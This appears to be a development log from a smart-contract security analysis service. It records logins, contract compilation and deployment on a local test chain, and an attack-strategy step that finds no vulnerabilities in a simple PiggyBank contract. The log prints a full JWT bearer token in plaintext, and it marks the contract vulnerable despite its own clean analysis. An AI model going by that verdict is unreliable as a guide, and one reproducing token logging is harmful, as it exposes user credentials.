`payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  \n- **Backdoors:** None found.  \n- **Economic Exploits:** None found.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address target) {}\n\n    function attack() external {}\n}', 'code_type': 'solidity', 'duration': 9.733391523361206}
2025-06-21 16:00:42,424 - app.services.contract_service - INFO - Has exploit code: True
2025-06-21 16:00:42,425 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-21 16:00:42,427 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-21 16:00:42,428 - app.services.contract_service - INFO - Attack strategy summary: - **Reentrancy:** No reentrancy vulnerability here because the contract uses `transfer()` which forwards a fixed 2300 gas stipend, preventing reentrant calls. Also, no state changes occur after the transfer call.  
- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public setter or owner change function exists, so ownership cannot be hijacked after deployment.  
- **Denial of Service:** The use of `transfer()` can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially blocking withdrawals. However, this is a known tradeoff and not necessarily a vulnerability.  
- **Logic Bugs:** None detected. The contract logic is straightforward and minimal.  
- **Math Errors:** Not applicable, no arithmetic operations.  
- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe in Solidity 0.8.0 context.  
- **Backdoors:** None found.  
- **Economic Exploits:** None found.

3.
2025-06-21 16:00:42,430 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-21 16:00:42,431 - app.services.contract_service - INFO - Temporary file /tmp/tmp6jsnfqht.sol removed
2025-06-21 16:00:42,473 - app.api.contract - INFO - Report saved with filename: PiggyBank_2025-06-21_16-00, status: KO
2025-06-21 16:00:42,475 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 16:00:42,477 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:42,481 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:42,482 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:42,483 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 16:00:42,485 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:42] "POST /analyze HTTP/1.1" 200 -
2025-06-21 16:00:42,504 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:42,510 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:42,512 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:42,514 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 16:00:42,518 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:42] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 16:00:42,566 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:42,569 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:42,570 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:42,571 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 16:00:42,573 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:42] "GET /history HTTP/1.1" 200 -
2025-06-21 16:00:49,019 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:49,027 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:49,032 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:49,036 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-21 16:00:49,040 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:49] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 16:00:49,061 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 16:00:49,108 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 4, statut: OK, poids de la requ√™te: 2.0
2025-06-21 16:00:49,110 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:49,112 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:49,113 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:49,114 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 16:00:49,116 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:49] "POST /feedback HTTP/1.1" 200 -
2025-06-21 16:00:51,942 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-21 16:00:51,947 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-21 16:00:51,949 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-21 16:00:51,952 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-21 16:00:51,954 - werkzeug - INFO - 172.30.0.1 - - [21/Jun/2025 16:00:51] "GET /history HTTP/1.1" 200 -
2025-06-22 20:20:32,406 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-22 20:20:32,645 - app.app - INFO - Application started
2025-06-22 20:20:32,658 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.112.5:8000
2025-06-22 20:20:32,661 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-22 20:20:52,142 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:20:52,148 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:20:52,152 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:20:52,156 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:20:52,162 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:20:52] "OPTIONS /login HTTP/1.1" 200 -
2025-06-22 20:20:52,180 - app.api.auth - INFO - Received login request with method: POST
2025-06-22 20:20:52,182 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA1MjU5NDh9.A_jEzmHRIJMeGon7yNpr3Ebkvd6XnzIryGuOo_5NNw4', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '39', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-22 20:20:52,184 - app.api.auth - INFO - Request content type: application/json
2025-06-22 20:20:52,185 - app.api.auth - INFO - Processing JSON request
2025-06-22 20:20:52,188 - app.api.auth - INFO - Attempting to authenticate user with wallet: user
2025-06-22 20:20:52,240 - app.api.auth - WARNING - Invalid credentials for wallet: user, error: Invalid credentials
2025-06-22 20:20:52,243 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:20:52,245 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:20:52,247 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:20:52,249 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:20:52,252 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:20:52] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-22 20:21:41,716 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:21:41,725 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:21:41,728 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:21:41,732 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:21:41,736 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:21:41] "OPTIONS /register HTTP/1.1" 200 -
2025-06-22 20:21:41,755 - app.api.auth - INFO - Received register request with method: POST
2025-06-22 20:21:41,759 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-22 20:21:41,761 - app.api.auth - INFO - Request content type: application/json
2025-06-22 20:21:41,762 - app.api.auth - INFO - Processing JSON request
2025-06-22 20:21:41,765 - app.api.auth - INFO - Attempting to register user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:21:42,190 - app.api.auth - INFO - Registration successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:21:42,192 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:21:42,194 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:21:42,195 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:21:42,197 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:21:42,199 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:21:42] "POST /register HTTP/1.1" 200 -
2025-06-22 20:21:47,595 - app.api.auth - INFO - Received login request with method: POST
2025-06-22 20:21:47,601 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-22 20:21:47,605 - app.api.auth - INFO - Request content type: application/json
2025-06-22 20:21:47,607 - app.api.auth - INFO - Processing JSON request
2025-06-22 20:21:47,609 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:21:48,007 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:21:48,010 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:21:48,012 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:21:48,013 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:21:48,014 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:21:48,016 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:21:48] "POST /login HTTP/1.1" 200 -
2025-06-22 20:21:53,271 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:21:53,280 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:21:53,286 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:21:53,291 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:21:53,295 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:21:53] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-22 20:21:53,321 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:21:53,334 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 20:21:53,340 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 20:21:53,346 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpgxxze42y.sol
2025-06-22 20:21:53,354 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 20:21:53,356 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 20:21:53,496 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-22 20:21:54,587 - solcx - INFO - Using solc version 0.8.0
2025-06-22 20:21:54,589 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-22 20:21:54,593 - solcx - INFO - Using solc version 0.8.0
2025-06-22 20:21:55,592 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-22 20:21:55,594 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-22 20:21:56,129 - app.services.contract_service - INFO - Contract PiggyBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-22 20:21:56,130 - app.services.contract_service - INFO - Setting up contract PiggyBank...
2025-06-22 20:21:56,346 - app.services.contract_service - INFO - Contract PiggyBank setup completed
2025-06-22 20:21:56,348 - app.services.contract_service - INFO - Funding contract PiggyBank for attack testing...
2025-06-22 20:21:56,843 - app.services.contract_service - INFO - Contract PiggyBank funded
2025-06-22 20:21:56,845 - app.services.contract_service - INFO - Building contract observation...
2025-06-22 20:21:57,114 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-22 20:21:57,116 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-22 20:21:57,117 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-22 20:21:57,129 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-22 20:21:57,149 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
